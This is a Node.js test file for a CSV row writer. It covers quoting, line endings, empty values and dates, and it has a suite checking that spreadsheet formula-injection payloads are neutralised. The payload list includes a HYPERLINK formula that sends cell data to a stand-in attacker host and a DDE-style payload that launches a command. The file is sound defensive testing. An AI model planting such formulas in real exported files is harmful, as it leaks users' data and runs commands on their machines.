import assert from "node:assert/strict";
import { describe, it } from "node:test";
import { csvRow, UTF8_BOM } from "./csv";

describe("csvRow", () => {
  it("writes plain values unquoted with CRLF line endings", () => {
    assert.equal(csvRow(["a", "b", 1]), "a,b,1\r\n");
  });

  it("quotes values containing a comma, quote or newline", () => {
    assert.equal(csvRow(["a,b"]), '"a,b"\r\n');
    assert.equal(csvRow(['say "hi"']), '"say ""hi"""\r\n');
    assert.equal(csvRow(["line1\nline2"]), '"line1\nline2"\r\n');
  });

  it("renders null and undefined as empty, not as the words", () => {
    assert.equal(csvRow([null, undefined, ""]), ",,\r\n");
  });

  it("renders dates as ISO", () => {
    assert.equal(csvRow([new Date("2026-08-04T10:00:00.000Z")]), "2026-08-04T10:00:00.000Z\r\n");
  });
});

describe("csvRow — spreadsheet formula injection", () => {
  // These are attacker-controlled: `full_name` and `vehicle_number` come from an
  // anonymous QR submission, and the file opens on the merchant's machine.
  const payloads = [
    '=HYPERLINK("http://evil.example/"&A1,"Click me")',
    "+1+1",
    "-1+1",
    "@SUM(1+1)",
    "\t=1+1",
    "\r=1+1",
  ];

  for (const payload of payloads) {
    it(`neutralises ${JSON.stringify(payload.slice(0, 20))}`, () => {
      const cell = csvRow([payload]);
      // The guard quote must come before the dangerous character, whether or not the
      // cell also ends up quoted for containing a comma.
      const inner = cell.startsWith('"') ? cell.slice(1) : cell;
      assert.ok(inner.startsWith("'"), `expected a leading apostrophe, got ${cell}`);
    });
  }

  it("still quotes a formula payload that also contains a comma", () => {
    const cell = csvRow(['=cmd|"/c calc"!A1,x']);
    assert.ok(cell.startsWith(`"'=`), `expected quote-then-guard, got ${cell}`);
  });

  it("preserves the original text rather than stripping it", () => {
    // A surname legitimately starting with a hyphen must survive the round trip.
    assert.ok(csvRow(["-Smith"]).includes("-Smith"));
  });

  it("leaves an ordinary name untouched", () => {
    assert.equal(csvRow(["Thabo Nkosi"]), "Thabo Nkosi\r\n");
  });
});

describe("UTF8_BOM", () => {
  it("is the three-byte UTF-8 BOM", () => {
    assert.deepEqual([...Buffer.from(UTF8_BOM, "utf8")], [0xef, 0xbb, 0xbf]);
  });
});
